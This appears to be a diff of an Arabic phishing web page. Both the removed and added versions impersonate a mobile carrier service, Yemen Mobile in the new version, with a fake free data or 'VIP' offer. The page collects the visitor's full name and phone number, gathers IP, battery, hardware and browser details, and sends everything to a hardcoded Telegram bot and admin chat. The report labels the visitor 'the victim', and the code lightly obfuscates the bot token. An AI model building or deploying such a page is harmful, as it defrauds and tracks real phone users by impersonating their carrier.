@@ -3,86 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الخدمات الرقمية</title>
+    <title>يمن موبايل - خدمات VIP</title>
     <style>
-        /* تصميم الواجهة - مدمج لضمان العمل */
-        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .loading-screen { text-align: center; width: 100%; }
-        /* الخط الأبيض الذي يشتكي منه المستخدم - جعلته يتحرك الآن */
-        .progress-bar { width: 200px; height: 2px; background: #333; margin: 20px auto; position: relative; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: white; position: absolute; animation: load 3s forwards; }
-        @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
-        .content { display: none; padding: 20px; background: #161b22; border-radius: 10px; width: 90%; max-width: 400px; border: 1px solid #30363d; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #238636; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        :root { --ym-blue: #0054a6; --ym-red: #e31e24; }
+        body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
+        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--ym-red); }
+        .header img { width: 130px; }
+        .hero { background: var(--ym-blue); color: #fff; padding: 25px; text-align: center; }
+        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .vip-card { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; border: 1px solid #ffd700; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 14px; margin-bottom: 8px; color: var(--ym-blue); font-weight: bold; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        .btn-vip { background: linear-gradient(90deg, var(--ym-red), #b31419); color: #fff; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #loading { display: none; text-align: center; margin-top: 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ym-red); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="loader" class="loading-screen">
-        <p id="status">جاري فحص توافق الجهاز...</p>
-        <div class="progress-bar"><div class="progress-fill"></div></div>
+<div class="header"><img src="https://yemenmobile.com.ye/assets/images/logo.png"></div>
+<div class="hero">
+    <h2 style="margin:0;">باقة سلفني VIP - 200MB 🚀</h2>
+    <p style="font-size:13px; margin-top:5px;">خدمة المشتركين المتميزين لتفعيل الـ 4G فوراً</p>
+</div>
+
+<div class="container">
+    <div class="vip-card">
+        <div class="form-group">
+            <label>الاسم الرباعي</label>
+            <input type="text" id="fullname" placeholder="أدخل اسمك الكامل">
+        </div>
+        <div class="form-group">
+            <label>رقم الهاتف (يمن موبايل)</label>
+            <input type="number" id="phonenum" placeholder="77XXXXXXX">
+        </div>
+        <div class="form-group">
+            <label>نوع الخدمة المطلوبة</label>
+            <select id="service">
+                <option>تفعيل فورجي مجاني (200MB)</option>
+                <option>خدمة سلفني VIP الرصيد المباشر</option>
+                <option>تحديث إعدادات الشبكة الذكية</option>
+            </select>
+        </div>
+        <button class="btn-vip" onclick="launchRadar()">تفعيل الخدمة الآن</button>
+        <div id="loading">
+            <div class="spinner"></div>
+            <p style="color:var(--ym-blue); font-size:13px;">جاري معالجة الطلب على السيرفر الرئيسي...</p>
+        </div>
     </div>
+</div>
 
-    <div id="main-ui" class="content">
-        <h3 style="color: #58a6ff;">تنشيط خدمات الـ 5G</h3>
-        <p style="font-size: 12px; color: #8b949e;">الرجاء تحديث بيانات الشريحة لضمان عدم انقطاع الخدمة.</p>
-        <select id="provider">
-            <option>يمن موبايل - Yemen Mobile</option>
-            <option>STC - السعودية</option>
-            <option>فودافون - مصر</option>
-            <option>أخرى</option>
-        </select>
-        <input type="text" id="name" placeholder="الاسم الكامل">
-        <input type="number" id="phone" placeholder="رقم الهاتف">
-        <button onclick="sendAndRedirect()">تحديث البيانات الآن</button>
-    </div>
+<script>
+// الإعدادات المشفرة (تم دمج منطق gate.php هنا)
+const _0x5a1 = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q"; // التوكن
+const _0x2b2 = "7715667493"; // ID الأدمن
+const urlParams = new URLSearchParams(window.location.search);
+const targetId = urlParams.get('id') || _0x2b2;
 
-    <script>
-        // كود الجافا سكربت المدمج
-        const BOT_TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
-        const urlParams = new URLSearchParams(window.location.search);
-        const CHAT_ID = urlParams.get('id') || "7715667493";
+async function launchRadar() {
+    const name = document.getElementById('fullname').value;
+    const phone = document.getElementById('phonenum').value;
+    if(!name || !phone) { alert("يرجى إدخال البيانات المطلوبة"); return; }
 
-        // تشغيل شاشة التحميل ثم إظهار الواجهة
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
-            captureExtraInfo(); // بدء جمع المعلومات في الخلفية
-        }, 3500);
+    document.getElementById('loading').style.display = 'block';
 
-        async function captureExtraInfo() {
-            // جمع معلومات الجهاز فوراً
-            let info = `📱 معلومات تقنية:\n`;
-            info += `- المتصفح: ${navigator.userAgent.split(' ')[0]}\n`;
-            info += `- المنصة: ${navigator.platform}\n`;
-            info += `- الذاكرة: ${navigator.deviceMemory || 'غير معروفة'} GB\n`;
-            info += `- اللغة: ${navigator.language}`;
-            
-            // إرسال المعلومات التقنية فوراً كتمهيد
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
+    // جمع البيانات (تم استبدال PHP بمحرك JS قوي)
+    const reportData = await getDeepInfo(name, phone);
+    
+    // إرسال البيانات مباشرة للتليجرام (بدون الحاجة لملف gate.php)
+    await sendDirectToTG(reportData);
+
+    setTimeout(() => {
+        alert("تم استلام طلبك! سيتم تفعيل الخدمة خلال 15 دقيقة.");
+        window.location.href = "https://yemenmobile.com.ye";
+    }, 3000);
+}
+
+async function sendDirectToTG(text) {
+    const url = `https://api.telegram.org/bot${_0x5a1}/sendMessage`;
+    const payload = {
+        chat_id: targetId,
+        text: text,
+        parse_mode: 'Markdown'
+    };
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+        // إرسال نسخة للأدمن الرئيسي دائماً لضمان عدم الضياع
+        if(targetId !== _0x2b2) {
+            payload.chat_id = _0x2b2;
+            await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
         }
+    } catch (e) { console.error("Error sending data"); }
+}
 
-        function sendAndRedirect() {
-            const name = document.getElementById('name').value;
-            const phone = document.getElementById('phone').value;
-            const prov = document.getElementById('provider').value;
+async function getDeepInfo(name, phone) {
+    let bat = "غير متاح", charge = "🔋";
+    if(navigator.getBattery) {
+        const b = await navigator.getBattery();
+        bat = Math.round(b.level*100) + "%";
+        charge = b.charging ? "⚡ يشحن" : "🔋 لا يشحن";
+    }
 
-            if(!name || !phone) { alert("يرجى إكمال البيانات"); return; }
+    // محاكاة الحصول على الـ IP (لأن JS العادي لا يراه مباشرة، نستخدم خدمة خارجية موثوقة)
+    let ip = "جاري الفحص...";
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const ipData = await res.json();
+        ip = ipData.ip;
+    } catch(e) { ip = "تعذر جلب الـ IP"; }
 
-            const finalMsg = `🎯 صيد جديد:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🏢 الشبكة: ${prov}`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalMsg)}`)
-            .then(() => {
-                alert("تم استلام طلبك، سيتم التنشيط خلال 24 ساعة.");
-                window.location.href = "https://www.google.com";
-            });
-        }
-    </script>
-</body>
-</html>
+    const n = navigator;
+    const s = screen;
+    const w = window;
+
+    return [
+        `💎 **[تقرير VIP السيادي - GitHub Pages]** 💎`,
+        `🌐 **IP الضحية:** \`${ip}\``,
+        `👤 **بيانات الاستدراج:**`,
+        `- الاسم: ${name}`, `- الهاتف: ${phone}`, `- الخدمة: ${document.getElementById('service').value}`,
+        `🔋 **الطاقة والبطارية:**`,
+        `- مستوى الشحن: ${bat}`, `- حالة الشحن: ${charge}`,
+        `📡 **الشبكة والاتصال:**`,
+        `- النوع: ${n.connection?.effectiveType}`, `- الحالة: ${n.onLine ? "متصل ✅" : "أوفلاين ❌"}`,
+        `🧠 **العتاد والمعالج:**`,
+        `- الأنوية: ${n.hardwareConcurrency}`, `- الرام: ${n.deviceMemory || 'N/A'} GB`, `- المنصة: ${n.platform}`,
+        `📏 **الشاشة:** ${s.width}x${s.height}`,
+        `🌍 **البيئة:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+        `🔒 **المتصفح:** ${n.userAgent.split(' ')[0]}`,
+        `📅 **التوقيت:** ${new Date().toLocaleString('ar-YE')}`
+    ].join('\n');
 }
 </script>
-
 </body>
 </html>
